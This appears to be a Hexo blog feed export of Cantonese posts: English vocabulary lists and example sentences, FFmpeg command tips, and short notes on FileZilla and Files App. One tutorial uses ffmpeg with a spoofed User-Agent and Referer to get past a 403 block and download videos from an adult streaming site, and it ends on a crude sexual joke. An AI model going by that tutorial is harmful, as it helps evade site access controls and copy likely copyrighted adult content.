<li>incorrect to use social media also will affect your own health</li>
</ul>
<h2 id="因而會造成一個錯誤的成長"><a href="#因而會造成一個錯誤的成長" class="headerlink" title="因而會造成一個錯誤的成長"></a>因而會造成一個錯誤的成長</h2><ul>
<li>Thus, the wrong growing will be caused<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- Thus, it will cause a wrong growth</span></span><br></pre></td></tr></table></figure>
<h2 id="社交媒體會令青少年荒廢學業"><a href="#社交媒體會令青少年荒廢學業" class="headerlink" title="社交媒體會令青少年荒廢學業"></a>社交媒體會令青少年荒廢學業</h2></li>
<li>Social media will cause youth to waste their education</li>
</ul>
<h2 id="影響學業成績"><a href="#影響學業成績" class="headerlink" title="影響學業成績"></a>影響學業成績</h2><ul>
<li>affects school grades</li>
</ul>
<h2 id="青少年看到社交媒體上的行為便會學習他們和跟隨他們"><a href="#青少年看到社交媒體上的行為便會學習他們和跟隨他們" class="headerlink" title="青少年看到社交媒體上的行為便會學習他們和跟隨他們"></a>青少年看到社交媒體上的行為便會學習他們和跟隨他們</h2><ul>
<li>the teens watching social media behavior and learn from them and follow them</li>
</ul>
<h2 id="由於心智未成熟"><a href="#由於心智未成熟" class="headerlink" title="由於心智未成熟"></a>由於心智未成熟</h2><ul>
<li>owing to the immature mentality</li>
<li>Due to the immaturity of the mind</li>
</ul>
<h2 id="因此，影響學習成績"><a href="#因此，影響學習成績" class="headerlink" title="因此，影響學習成績"></a>因此，影響學習成績</h2><ul>
<li>affect study result thus</li>
</ul>
<h2 id="考試的成績一落千丈"><a href="#考試的成績一落千丈" class="headerlink" title="考試的成績一落千丈"></a>考試的成績一落千丈</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">- The exams have gone down in value.</span><br><span class="line">+ His grade is plummeted</span><br></pre></td></tr></table></figure>
<h2 id="很多青少年都沒有自制能力"><a href="#很多青少年都沒有自制能力" class="headerlink" title="很多青少年都沒有自制能力"></a>很多青少年都沒有自制能力</h2><ul>
<li>Many young people do not have the ability to control themselves</li>
</ul>
<h2 id="它就像一把刀﹐用得恰當﹐它就是煮食的工具"><a href="#它就像一把刀﹐用得恰當﹐它就是煮食的工具" class="headerlink" title="它就像一把刀﹐用得恰當﹐它就是煮食的工具"></a>它就像一把刀﹐用得恰當﹐它就是煮食的工具</h2><ul>
<li>It is like a knife,when used properly, it is a tool for cooking.</li>
</ul>
<h2 id="相反，用得不當﹐它卻是一種傷害自己和別人的武器"><a href="#相反，用得不當﹐它卻是一種傷害自己和別人的武器" class="headerlink" title="相反，用得不當﹐它卻是一種傷害自己和別人的武器"></a>相反，用得不當﹐它卻是一種傷害自己和別人的武器</h2><ul>
<li>On the contrary, when used badly, it is a weapon that hurts oneself and others.</li>
</ul>
<h2 id="沉溺於社交媒體"><a href="#沉溺於社交媒體" class="headerlink" title="沉溺於社交媒體"></a>沉溺於社交媒體</h2><ul>
<li>Indulgence in social media</li>
</ul>
<h2 id="年輕人的溝通技巧"><a href="#年輕人的溝通技巧" class="headerlink" title="年輕人的溝通技巧"></a>年輕人的溝通技巧</h2><ul>
<li>communication skills of young people</li>
</ul>
<h2 id="溝通技巧"><a href="#溝通技巧" class="headerlink" title="溝通技巧"></a>溝通技巧</h2><ul>
<li>communication skills</li>
</ul>
<h2 id="這取決於你"><a href="#這取決於你" class="headerlink" title="這取決於你"></a>這取決於你</h2><ul>
<li>it depends on you</li>
</ul>
<h2 id="大多數人"><a href="#大多數人" class="headerlink" title="大多數人"></a>大多數人</h2><ul>
<li>most people</li>
</ul>
<h2 id="在當代世界"><a href="#在當代世界" class="headerlink" title="在當代世界"></a>在當代世界</h2><ul>
<li>In the contemporary world</li>
</ul>
<h2 id="使用社交媒體獲取新聞、娛樂、尋找資料"><a href="#使用社交媒體獲取新聞、娛樂、尋找資料" class="headerlink" title="使用社交媒體獲取新聞、娛樂、尋找資料"></a>使用社交媒體獲取新聞、娛樂、尋找資料</h2><ul>
<li>use social media to get news, entertainment, and search for information.</li>
</ul>
<h2 id="社交媒體的出現已經大大地改變了人與人與他人互動的方式"><a href="#社交媒體的出現已經大大地改變了人與人與他人互動的方式" class="headerlink" title="社交媒體的出現已經大大地改變了人與人與他人互動的方式"></a>社交媒體的出現已經大大地改變了人與人與他人互動的方式</h2><ul>
<li>the advent of social media has dramatically changed the way people interact with others</li>
</ul>
<h2 id="社交媒體已經成為了人類生活的一部分"><a href="#社交媒體已經成為了人類生活的一部分" class="headerlink" title="社交媒體已經成為了人類生活的一部分"></a>社交媒體已經成為了人類生活的一部分</h2><ul>
<li>social media has become a part of human life. </li>
</ul>
<hr>
<h2 id="這是兩種不同的感覺"><a href="#這是兩種不同的感覺" class="headerlink" title="這是兩種不同的感覺"></a>這是兩種不同的感覺</h2><ul>
<li>It’s two different feelings</li>
</ul>
<h2 id="永遠記得那個地方的每一個細節"><a href="#永遠記得那個地方的每一個細節" class="headerlink" title="永遠記得那個地方的每一個細節"></a>永遠記得那個地方的每一個細節</h2><ul>
<li>always remember each and every detail of that place</li>
</ul>
<h2 id="煥然一新的"><a href="#煥然一新的" class="headerlink" title="煥然一新的"></a>煥然一新的</h2><ul>
<li>rejurenated</li>
</ul>
<h2 id="每個"><a href="#每個" class="headerlink" title="每個"></a>每個</h2><ul>
<li>each</li>
</ul>
<h2 id="正面"><a href="#正面" class="headerlink" title="正面"></a>正面</h2><ul>
<li>positive</li>
</ul>
<h2 id="自己的"><a href="#自己的" class="headerlink" title="自己的"></a>自己的</h2><ul>
<li>own</li>
</ul>
<h2 id="這些"><a href="#這些" class="headerlink" title="這些"></a>這些</h2><ul>
<li>these</li>
</ul>
<h2 id="缺少"><a href="#缺少" class="headerlink" title="缺少"></a>缺少</h2><ul>
<li>lack</li>
</ul>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><ul>
<li>cause</li>
</ul>
<h2 id="越來越多"><a href="#越來越多" class="headerlink" title="越來越多"></a>越來越多</h2><ul>
<li> more and more</li>
</ul>
<h2 id="無論-1"><a href="#無論-1" class="headerlink" title="無論"></a>無論</h2><ul>
<li>no matter what</li>
</ul>
<h2 id="心態不成熟"><a href="#心態不成熟" class="headerlink" title="心態不成熟"></a>心態不成熟</h2><ul>
<li>immature mentality</li>
</ul>
<h2 id="行為"><a href="#行為" class="headerlink" title="行為"></a>行為</h2><ul>
<li>behavior</li>
</ul>
<h2 id="有害"><a href="#有害" class="headerlink" title="有害"></a>有害</h2><ul>
<li>harmful</li>
</ul>
<h2 id="自我控制"><a href="#自我控制" class="headerlink" title="自我控制"></a>自我控制</h2><ul>
<li>self-control</li>
</ul>
<h2 id="生長不良"><a href="#生長不良" class="headerlink" title="生長不良"></a>生長不良</h2><ul>
<li>poor growth</li>
</ul>
<h2 id="雙面刃"><a href="#雙面刃" class="headerlink" title="雙面刃"></a>雙面刃</h2><ul>
<li>two-bladed sword</li>
</ul>
<h2 id="絕對地"><a href="#絕對地" class="headerlink" title="絕對地"></a>絕對地</h2><ul>
<li>absolutely</li>
</ul>
<h2 id="我們自己"><a href="#我們自己" class="headerlink" title="我們自己"></a>我們自己</h2><ul>
<li>ourselves</li>
</ul>
]]></content>
      <categories>
        <category>English</category>
      </categories>
      <tags>
        <tag>Vocab</tag>
      </tags>
  </entry>
  <entry>
    <title>English - 詞語列表</title>
    <url>/2021/12/13/English-Notes-Vocabulary/</url>
    <content><![CDATA[<img src="cover.png" width="200px"/>

<h1 id="Essay"><a href="#Essay" class="headerlink" title="Essay"></a>Essay</h1><ul>
<li>The relationship between social media and student school result | 社交媒體與學生學業成績的關係</li>
<li>The meaning Of Travelling | 旅行的意義</li>
<li>Person - 寫條友</li>
</ul>
<h2 id="社交媒體與學生學業成績的關係"><a href="#社交媒體與學生學業成績的關係" class="headerlink" title="社交媒體與學生學業成績的關係"></a>社交媒體與學生學業成績的關係</h2><blockquote>
<p>+ 為正面詞語<br>- 為負面詞語</p>
</blockquote>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">// Vocabulary</span><br><span class="line"></span><br><span class="line"><span class="deletion">- addiction 成癮</span></span><br><span class="line"><span class="addition">+ anonymous 匿名的</span></span><br><span class="line"><span class="deletion">- anxiety 焦慮</span></span><br><span class="line"><span class="addition">+ differ 不同</span></span><br><span class="line"><span class="deletion">- disease 疾病</span></span><br><span class="line"><span class="deletion">- excessive 過度的</span></span><br><span class="line"><span class="addition">+ individual 個人</span></span><br><span class="line"><span class="addition">+ platform 平台</span></span><br><span class="line"><span class="addition">+ privacy 隱私</span></span><br><span class="line"><span class="deletion">- unreallistic 不切實際的</span></span><br><span class="line"><span class="addition">+ variety 種類</span></span><br><span class="line"><span class="addition">+ identity 身份</span></span><br></pre></td></tr></table></figure>

<h3 id="1-Addiction-成癮-例句"><a href="#1-Addiction-成癮-例句" class="headerlink" title="1. Addiction 成癮 (例句)"></a>1. <span style="color:red">Addiction</span> 成癮 (例句)</h3><p>The Internet has made life a lot easier by making information more accessible to all and creating connections with different people around the world. However, it has also led a lot of people to spend too much time in front of the computer, so much so that it becomes the center of their lives. This can lead to an Internet or computer <span style="color:red">addiction</span>.</p>
<blockquote>
<p>互聯網通過讓所有人更容易獲取信息並與世界各地不同的人建立聯繫，使生活變得更加輕鬆。 然而，它也導致很多人在電腦前花費太多時間，以至於它成為他們生活的中心。 這可能導致互聯網或計算機成癮。 </p>
</blockquote>
<h3 id="2-Anonymous-匿名的-例句"><a href="#2-Anonymous-匿名的-例句" class="headerlink" title="2. Anonymous 匿名的 (例句)"></a>2. <span style="color:red">Anonymous</span> 匿名的 (例句)</h3><p>in addition,When you <span style="color:red">anonymous</span> chat text, you can pretty much say what you want without having to see the reaction on the other person’s face. There is no way for a text chat to be interrupted, so you can always get your point across. And ultimately, texting sometimes gives you the courage to say what you really mean instead of toning it down, muddying the waters, or holding things back for fear of reprisal.</p>
<blockquote>
<p>此外，當你匿名聊天文本時，你幾乎可以說出你想說的話，而不必看到對方臉上的反應。 文字聊天不會被打斷，因此您始終可以表達您的觀點。 最終，發短信有時會讓你有勇氣說出你真正的意思，而不是淡化它、攪渾水，或者因為害怕報復而拖延。</p>
</blockquote>
<h3 id="3-Identity-身份-例句"><a href="#3-Identity-身份-例句" class="headerlink" title="3. Identity 身份 (例句)"></a>3. <span style="color:red">Identity</span> 身份 (例句)</h3><p>On the personal side, people who are addicted to using social media will put everything on social media. It is also possible that your personal photo will be used to create a fake page, and your <span style="color:red">identity</span> may be used to do something illegal, such as spreading a virus using your <span style="color:red">identity</span>, and people who are unaware will be victimized.</p>
<blockquote>
<p>在個人方面，使用成癮後的人會什麼也放在社交媒體上，也有可能你的個人照片被使用，偽造假的專頁，可能利用你的身份去做一些不法行動，例如以你的身份散播病毒，不知道的人沒警覺後會受害。</p>
</blockquote>
<h2 id="寫條友"><a href="#寫條友" class="headerlink" title="寫條友"></a>寫條友</h2><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">// Vocabulary</span><br><span class="line"></span><br><span class="line"><span class="addition">+ approximately 大約 </span></span><br><span class="line"><span class="addition">+ associate 聯繫</span></span><br><span class="line"><span class="addition">+ available 可用的 </span></span><br><span class="line"><span class="deletion">- damge 損害 </span></span><br><span class="line"><span class="addition">+ essence 本質 </span></span><br><span class="line"><span class="addition">+ personality 性格 </span></span><br><span class="line"><span class="addition">+ significant 重要的</span></span><br></pre></td></tr></table></figure>

<h1 id="Listening-Vocab"><a href="#Listening-Vocab" class="headerlink" title="Listening Vocab"></a>Listening Vocab</h1><ul>
<li>Joining a video competition | 參加短片製作比賽</li>
<li>Restaurant review | 餐廳 Review</li>
</ul>
<h2 id="1-Joining-a-video-competition-參加短片製作比賽"><a href="#1-Joining-a-video-competition-參加短片製作比賽" class="headerlink" title="1. Joining a video competition 參加短片製作比賽"></a>1. Joining a video competition 參加短片製作比賽</h2><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">+ Cantonese 粵語</span></span><br><span class="line"><span class="addition">+ competition 競爭;比賽</span></span><br><span class="line"><span class="addition">+ coversation 對話</span></span><br><span class="line"><span class="addition">+ documentaries 紀錄片</span></span><br><span class="line"><span class="addition">+ response 回應</span></span><br><span class="line"><span class="addition">+ subtitles 字幕</span></span><br><span class="line"><span class="addition">+ participant 參與者</span></span><br></pre></td></tr></table></figure>

<h2 id="2-Restaurant-review-餐廳Review"><a href="#2-Restaurant-review-餐廳Review" class="headerlink" title="2. Restaurant review 餐廳Review"></a>2. Restaurant review 餐廳Review</h2><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">+ deduct 扣除</span></span><br><span class="line"><span class="addition">+ environment 環境</span></span><br><span class="line"><span class="addition">+ equipment 設備</span></span><br><span class="line"><span class="addition">+ expensive 昂貴的</span></span><br><span class="line"><span class="addition">+ experience 經驗</span></span><br><span class="line"><span class="addition">+ fresh 新鮮</span></span><br><span class="line"><span class="addition">+ ingredient 食材</span></span><br><span class="line"><span class="addition">+ inspector 檢查者</span></span><br><span class="line"><span class="addition">+ investor 投資者</span></span><br><span class="line"><span class="addition">+ overcooked 食物過熟的</span></span><br><span class="line"><span class="addition">+ participant 參與者</span></span><br><span class="line"><span class="addition">+ pasta 意大利粉</span></span><br></pre></td></tr></table></figure>

<h1 id="Vocabulary-for-Reading"><a href="#Vocabulary-for-Reading" class="headerlink" title="Vocabulary for Reading"></a>Vocabulary for Reading</h1><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">+ acceptable 可接受的</span></span><br><span class="line"><span class="addition">+ acceptance 接受</span></span><br><span class="line"><span class="addition">+ adventure 冒險</span></span><br><span class="line"><span class="addition">+ attempt 嘗試</span></span><br><span class="line"><span class="addition">+ conform 遵守;順從</span></span><br><span class="line"><span class="deletion">- congested 擁擠的</span></span><br><span class="line"><span class="deletion">- controversy 爭議</span></span><br><span class="line"><span class="deletion">- demanding 耗費精力的</span></span><br><span class="line"><span class="deletion">- drawback 壞處</span></span><br><span class="line"><span class="deletion">- dreaded 令人害怕的</span></span><br><span class="line"><span class="addition">+ estimate 估計</span></span><br><span class="line"><span class="addition">+ expedition 遠征;探險;考察</span></span><br><span class="line"><span class="addition">+ flexibility 靈活性</span></span><br><span class="line"><span class="deletion">- inadequate 不足的</span></span><br><span class="line"><span class="deletion">- insecurity 不安全感</span></span><br><span class="line"><span class="addition">+ investor 投資者</span></span><br><span class="line"><span class="addition">+ itinerary 行程</span></span><br><span class="line"><span class="addition">+ participant 參與者</span></span><br><span class="line"><span class="deletion">- polluted 被污染的</span></span><br><span class="line"><span class="addition">+ positivity 正面的</span></span><br><span class="line"><span class="addition">+ prominent 著名的;重要的</span></span><br><span class="line"><span class="addition">+ region 地區</span></span><br><span class="line"><span class="addition">+ significant 重要的</span></span><br><span class="line"><span class="addition">+ stuggle 掙扎</span></span><br><span class="line"><span class="deletion">- suicidal 自殺的</span></span><br><span class="line"><span class="deletion">- unrealistic 不切實際的</span></span><br><span class="line"><span class="deletion">- unworkable 不可行的    </span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>English</category>
      </categories>
      <tags>
        <tag>Vocab</tag>
      </tags>
  </entry>
  <entry>
    <title>FFMPEG - Bypass 403 權限問題</title>
    <url>/2022/06/16/FFMPEG-Bypass-403-m3u8/</url>
    <content><![CDATA[<img src="/img/Post/image/FFMPEG/cover.png" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>當你下載某網站的影片的時候，出現 403 問題不給你下載，解決方法只需使用 User Agents 就可以。</p>
<blockquote>
<p>說明 : 隨便找一個使用就好。</p>
</blockquote>
<p>User Agents :</p>
<pre><code>https://developers.whatismybrowser.com/useragents/explore/
</code></pre>
<h1 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h1><p>輸入以下指令。</p>
<p><strong>格式 :</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -user_agent [User Agents] -i [m3u8 file] -c copy [output name.mp4]</span><br></pre></td></tr></table></figure>

<p><strong>完整示範 :</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -user_agent <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36&quot;</span> -i  file.m3u8 -c copy file.mp4</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>FFMPEG</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>問題</tag>
      </tags>
  </entry>
  <entry>
    <title>FFMPEG - 下載 Jable.tv 影片教學 (直至 2022.6.30 仍然可用)</title>
    <url>/2021/12/13/FFMPEG-download-jabletv-video/</url>
    <content><![CDATA[<img src="jable.png" width="200px"/>

<h1 id="2022-6-16-訊息"><a href="#2022-6-16-訊息" class="headerlink" title="2022.6.16 訊息"></a>2022.6.16 訊息</h1><p>我發現原來 <code>youtube-dl</code> 同 <code>yt-dlp</code> 係有 support <code>Jable.tv</code> 既片，<br>所以以下咁多操作係唔洗做都得 =.=<br>但係以下既下載方法都係仲 work，當學一個操作囉，反正呢個方法有好多網都做到，唔一定係 <code>Jable.tv</code> 先可以 .w.</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>超級詳細教學下載 <code>Jable.tv</code> 片教學，方法大同小異。</p>
<p>需要既工具有以下：</p>
<ul>
<li><code>FFMPEG</code> (下面我會放 Download Link)</li>
<li>你既 <code>Terminal</code> (用黎打指令)</li>
<li>一個正常 <code>Browser</code></li>
</ul>
<h1 id="FFMPEG-下載"><a href="#FFMPEG-下載" class="headerlink" title="FFMPEG 下載"></a>FFMPEG 下載</h1><p>FFMPEG Download Link : <a href="https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-full.7z">撳呢度</a></p>
<div class="note warning flat">
    注意：有機會失效，我只係 Copy 條 Download Link 俾你一撳就 Download，改左自己再上 FFMPEG 搵。
</div>

<h1 id="安裝-FFMPEG"><a href="#安裝-FFMPEG" class="headerlink" title="安裝 FFMPEG"></a>安裝 FFMPEG</h1><ol>
<li>Download 完用你既解壓程式去開 (eg: <code>7zip</code>)。</li>
<li>我地淨係需要用入面既其中一個檔案，入 <code>ffmpeg-4.4-full_build</code> &gt; <code>bin</code>，你會見到 <code>ffmpeg.exe</code>，拉呢舊檔案出黎用。<br>今次既教學係唔需要用到其他個兩舊，然後呢一步你可以選擇做定唔做，建議跟住做 (因為方便你日後打指令)。</li>
</ol>
<h1 id="設置-Paths"><a href="#設置-Paths" class="headerlink" title="設置 Paths"></a>設置 Paths</h1><p>點解要設置 Paths，係因為如果你唔設置既話，你就要慢慢用 cmd cd 入去你個 FFMPEG 既路徑，咁樣做會哂你好多時間。</p>
<hr>
<h2 id="開啟-sysdm-cpl-環境變數"><a href="#開啟-sysdm-cpl-環境變數" class="headerlink" title="開啟 sysdm.cpl (環境變數)"></a>開啟 sysdm.cpl (環境變數)</h2><ol>
<li><p>首先，電腦 Search <code>sysdm.cpl</code>，撳完會需要用到系統管理員，你打返密碼入去就 OK。</p>
</li>
<li><p>再撳 <code>環境變數(N)</code></p>
</li>
<li><p>然後我地要加野喺 <code>系統變數</code>，喺入面拉落d搵一個叫 <code>Path</code> 既野，搵到之後撳一下再編輯。</p>
</li>
</ol>
<h2 id="新增變數內容"><a href="#新增變數內容" class="headerlink" title="新增變數內容"></a>新增變數內容</h2><ol>
<li>將你岩岩拉完既檔案 <code>ffmpeg.exe</code>，放去你想放既位置。</li>
<li>例如你想放喺 <code>D:\Program Files\Tools</code>，咁你放完係呢個位入面。</li>
<li>再去返岩岩編輯環境變數個位撳 <code>新增</code>。</li>
<li>再新增返你 Folder 既 Path，即係打 <code>D:\Program Files\Tools</code>。</li>
</ol>
<h1 id="尋找-m3u8-連結"><a href="#尋找-m3u8-連結" class="headerlink" title="尋找 m3u8 連結"></a>尋找 m3u8 連結</h1><ol>
<li>開你既 Browser (我用 Firefox)。</li>
<li>撳你鍵盤既 <code>F12</code> (Inspect)。</li>
<li>之後撳 <code>Network</code>。</li>
<li>再上 <code>Jable.tv</code>。</li>
<li>搵你想下載既片，呢度我用既例子係 <code>https://jable.tv/videos/ipx-258-c/</code>。</li>
<li>喺 Filter URLs 打 <code>m3u8</code> 極速搵條 link，當你成功搵到 m3u8 link 既時候，Copy 條 link：<br><code>https://qto-sara.mushroomtrack.com/hls/lZV1tlFoDmHKmafcXbv3BA/1656584219/0/108/108.m3u8</code>，呢條就係我地要既Link。</li>
</ol>
<div class="note warning flat">
    注意：搵唔到 m3u8 link 可能係因為你做漏左步驟，撳 F5 Refresh 再試下 Play 條片就一定會搵到架啦。
</div>

<img src="/2021/12/13/FFMPEG-download-jabletv-video/1.gif" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="下載影片"><a href="#下載影片" class="headerlink" title="下載影片"></a>下載影片</h1><p>而加我地需要用返岩岩我地裝完既 <code>ffmpeg.exe</code>，然後需要使用指令操作全程，<br>選擇你想要用既 <code>Terminal</code> (呢度我會用 Windows Terminal 做示範)。</p>
<hr>
<h2 id="選擇下載位置"><a href="#選擇下載位置" class="headerlink" title="選擇下載位置"></a>選擇下載位置</h2><p>然後呢度就選擇你要 Download 既位置，<br>假設原本我地要去 由 <code>C:</code> 去 <code>D:/Video</code>，就先打 <code>D:</code> 再打 <code>cd Video</code>。</p>
<img src="/2021/12/13/FFMPEG-download-jabletv-video/2.gif" class="">

<h3 id="確定位置後下載影片"><a href="#確定位置後下載影片" class="headerlink" title="確定位置後下載影片"></a>確定位置後下載影片</h3><p>黎到呢個位我地開始要真係下載條片，將下面條 code 放落你既 Terminal 然後 enter，咁就真係開始 download 緊條片。<br>另外，順便講解下條 code，我地會用一樣野黎成立我地既讀取影片再下載：<br><code>-user_agent</code> // 製造一個假 User-Agent<br><code>-c copy</code> // 幫個 file 改個名</p>
<div class="note warning flat">
    注意：如果你唔打呢句，因為 <code>Jable.tv</code> 本身係有處理過條片，普通既下載方法係唔得，我地加埋 User-Agent 喺入面就會解決到 <code>403</code> 既問題。
</div>

<div class="note info flat">
    當你見到 <code>[https @ 000001947ece8180] Opening 'https://qmm-truts.mushroomtrack.com/hls/NFb_sIwTdg3IZ6FeEFo9-g/1656586701/0/108/1082.ts' for reading</code> 呢啲野就代表已經讀取成功，開始下載緊。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -user_agent &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36&quot; -headers &quot;referer: https://jable.tv/&quot; -i &quot;https://qmm-truts.mushroomtrack.com/hls/NFb_sIwTdg3IZ6FeEFo9-g/1656586701/0/108/108.m3u8&quot; -c copy IPX-258.mp4</span><br></pre></td></tr></table></figure>

<img src="/2021/12/13/FFMPEG-download-jabletv-video/downloaded.png" class="">

<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>呢個等待既時候，你會見到多左個 files 叫 <code>IPX-258.mp4</code>，千奇唔好以為已經 downlaod 完，其實佢仲 download 緊，唔好中途冇拉拉閂左個 Windows (CMD)，咁會炒車搞到你要由頭再 down 過，又或者可能會喺 Download 到個個 time 既位完左條片。<br>當你等完之後，咁就搞掂哂啦，慢慢打你既 J 啦 hehe ~~</p>
<div class="note info flat">
    提示：如果你想整做 <code>part</code> file，等下次再繼續 download 條片既話，好可惜 <code>FFMPEG</code> 就好似冇呢個功能 ._.
</div>


<h3 id="完整下載示範-CAWD-091"><a href="#完整下載示範-CAWD-091" class="headerlink" title="完整下載示範 (CAWD-091)"></a>完整下載示範 (CAWD-091)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -user_agent <span class="string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&quot;</span> -headers <span class="string">&quot;referer: https://jable.tv/&quot;</span> -i <span class="string">&quot;https://record-smart.alonestreaming.com/hls/Jyz4bZStuyQzFk6168lSdA/1656587266/8000/8688/8688.m3u8&quot;</span> -c copy CAWD-091.mp4</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>FFMPEG</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>FFMPEG - concat : 不安全的檔案名稱錯誤 unsafe file name error</title>
    <url>/2022/07/05/FFMPEG-unsafe-file-name-error/</url>
    <content><![CDATA[<img src="/img/Post/image/FFMPEG/cover.png" width="200px"/>

<h1 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h1><p>當我嘗試使用 FFMPEG 的 concat 合成四個影片檔案的時候，發現出現以下錯誤：</p>
<pre><code>[concat @ 0000022a93303740] Unsafe file name &#39;第1集.mp4&#39;
</code></pre>
<p>文字檔內容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># video.txt 內容如下</span><br><span class="line"></span><br><span class="line">第1集.mp4</span><br><span class="line">第2集.mp4</span><br><span class="line">第3集.mp4</span><br><span class="line">第4集.mp4</span><br></pre></td></tr></table></figure>

<p>使用的指令是這樣：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg.exe -f concat -i .\video.txt -c copy full.mp4</span><br></pre></td></tr></table></figure>

<p>但是當我將檔案的中文字去除又正常運行？？</p>
<h1 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h1><p>只需要在 <code>-i</code> 前加上 <code>-safe 0</code> 就解決了，示範如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg.exe -f concat -safe 0 -i .\video.txt -c copy full.mp4</span><br></pre></td></tr></table></figure>

<p>參考資料：<br><a href="https://stackoverflow.com/questions/38996925/ffmpeg-concat-unsafe-file-name">https://stackoverflow.com/questions/38996925/ffmpeg-concat-unsafe-file-name</a></p>
]]></content>
      <categories>
        <category>FFMPEG</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>問題</tag>
      </tags>
  </entry>
  <entry>
    <title>FFplay - 詳情參數播放器</title>
    <url>/2022/01/14/FFplay-commands/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>ffplay 可以用黎播片，分析影片數據，改片大細，視頻圖像的運動估計方向，音頻數據的波形等。</p>
<p>普通播片</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffplay file.mp4</span><br></pre></td></tr></table></figure>

<p>FTP Live</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffplay rtsp://127.0.0.1/file.mp4</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://www.itread01.com/articles/1476439233.html">https://www.itread01.com/articles/1476439233.html</a><br><a href="https://blog.xuite.net/ian11832/blogg/37940154-ffmpeg,ffserver,ffplay%E7%9B%B8%E9%97%9C%E8%AA%AA%E6%98%8E%E7%AD%86%E8%A8%98">https://blog.xuite.net/ian11832/blogg/37940154-ffmpeg,ffserver,ffplay%E7%9B%B8%E9%97%9C%E8%AA%AA%E6%98%8E%E7%AD%86%E8%A8%98</a></p>
]]></content>
      <categories>
        <category>FFMPEG</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>FileZilla Client - Server 連接應用工具</title>
    <url>/2021/12/15/FileZilla-Client/</url>
    <content><![CDATA[<img src="filezilla.svg" width="200" height="200"/>

<h1 id="FileZilla-Client"><a href="#FileZilla-Client" class="headerlink" title="FileZilla Client"></a>FileZilla Client</h1><p>FileZilla Client 係一個俾你用黎Connect 你既 Server 用既一個軟件，佢有 Mac 版，Linux版，Windows版，並且支持 FTP，SSL / TLS 等，有下載，上載等唔同既功能。</p>
<p>【官方網站】：<a href="https://filezilla-project.org/">按這裡</a><br>【支援語言】：多國語言</p>
<h1 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h1><img src="/2021/12/15/FileZilla-Client/program.png" class="">


<h1 id="安裝-Linux"><a href="#安裝-Linux" class="headerlink" title="安裝 (Linux)"></a>安裝 (Linux)</h1><hr>
<h2 id="喺-Debian-Ubuntu-系統上裝"><a href="#喺-Debian-Ubuntu-系統上裝" class="headerlink" title="喺 Debian, Ubuntu 系統上裝"></a>喺 Debian, Ubuntu 系統上裝</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install filezilla</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>Files App - 取代 Windows 檔案總管</title>
    <url>/2022/05/23/Files-App-Apps/</url>
    <content><![CDATA[<p align="center">
    <img alt="Files App" src="cover.png" width="200px"/>
    <h1 align="center">Files App</h1>
</p>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一個可以取代 Windows 本身既 Explorer 既程式。</p>
<h1 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h1><ul>
<li>自訂主題</li>
<li>日期即時更新</li>
<li>新快速</li>
<li>Open Source (Github)</li>
<li>可設定透明</li>
</ul>
<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="program.png"/>


<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><h3 id="Winget"><a href="#Winget" class="headerlink" title="Winget"></a>Winget</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winget install -e 9NGHP3DX8HDX</span><br></pre></td></tr></table></figure>

